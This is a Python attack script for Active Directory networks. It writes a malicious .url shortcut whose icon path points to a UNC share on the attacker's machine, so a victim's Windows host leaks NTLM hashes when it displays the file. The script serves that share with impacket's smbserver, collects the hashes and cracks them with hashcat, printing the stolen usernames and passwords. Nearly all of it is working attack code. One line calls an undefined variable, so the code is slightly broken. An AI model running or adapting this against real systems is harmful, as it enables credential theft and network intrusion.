#This script is for linux only !
from subprocess import PIPE, Popen
import time
import os
import signal
import threading

iface = input("name of the interface connected to the AD network: ")
#set to True to enable cracking
crackhashes = True
#avoid using big wordlist
wordlist_path = ""

stolen = []

#colors
white = "\033[1;37;48m"
yellow = "\033[1;33;48m"
green = "\033[1;32;48m"
red = "\033[1;31;48m"
blue = "\033[1;34;48m"

print(white)
lock = threading.Lock()

#this get your local ip
ip = str(Popen("ip -4 addr show "+iface+" | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}'",shell=True,stdout=PIPE).stdout.read()).replace("b'","").replace("'","").replace("\\n","")
if len(ip)<2:
    raise Exception("Wrong interface/no ip")

tofile = f"[InternetShortcut]\nURL={ip}\nWorkingDirectory=\\\\{ip}\\icon\\\nIconFile=\\\\{ip}\\icon\\icon.ico\nIconIndex=1"
f=open("PoC_shortcut.url","w")
f.write(tofile)
f.close()
print("payload written to \"PoC_shortcut.url\"")
print("PAYLOAD\n-------------------\n"+tofile+"\n-------------------")



def crack(hashtocrack):
    if len(hashtocrack) < 500:
        Popen(f"hashcat \'{hashtocrack}\' {wordlist_path} -O -m 5500 -w 4 >/dev/null 2>&1",shell=True)
        time.sleep(2)
        cracked = str(Popen(f"hashcat \'{hashtocrack}\' -m 5500 --show 2>/dev/null",shell=True,stdout=PIPE).stdout.read()).replace("b'","").replace("'","")
    else:
        Popen(f"hashcat \'{hashtocrack}\' {wordlist_path} -O -m 5600 -w 4 >/dev/null 2>&1",shell=True)
        time.sleep(2)
        cracked = str(Popen(f"hashcat \'{hashtocrack}\' -m 5600 --show 2>/dev/null",shell=True,stdout=PIPE).stdout.read()).replace("b'","").replace("'","")
    username = hashtocrack.split(":")[0]
    time.sleep(2)
    if len(cracked) > 2:
        password = cracked.split(":")[-1].replace("\\n","")
        print(f"{green}[+] cracked !{white}")
        print(f"{green}[+]{white} username: {username}")
        print(f"{green}[+]{white} password: {password}")
        out = str(Popen(command,shell=True,stdout=PIPE).stdout.read()).replace("b'","").replace("b\"","").replace("\\n","")[:-1]
        print("")
    else:
        print(f"{red}[x]{white} {username} not cracked")
        print("")
    lock.release()



try:
    p = Popen(f'python smbserver.py -ip {ip} -smb2support icon icon',shell=True,stdout=PIPE)
    time.sleep(2)
    
    print(f"{blue}[*]{white} listening...\n")

    while True:
        stdout = str(p.stdout.readline()).replace("b'","").replace("'","")
        smbserver_output = stdout.replace("\\n","").replace("[*] ","") if stdout.count(":") == 5 else False
        logs = open("logs.txt","a")
        logs.write(stdout.replace("\\n","\n"))
        logs.close()
        if smbserver_output and smbserver_output.split(":")[0] + "::" + smbserver_output.split(":")[2] not in stolen:
            lock.acquire()
            print(f"{blue}[+]{white} got a hash! -> "+smbserver_output)
            stolen.append(smbserver_output.split(":")[0] + "::" + smbserver_output.split(":")[2])
            if crackhashes:
                print(f"{yellow}[!]{white} trying to crack it...")
                threading._start_new_thread(crack,(smbserver_output,))
            else:
                lock.release()
        

except Exception as e:
    print(e)
    #kills the smbserver when an error occurs
    os.killpg(os.getpgid(p.pid), signal.SIGTERM)

os.killpg(os.getpgid(p.pid), signal.SIGTERM)
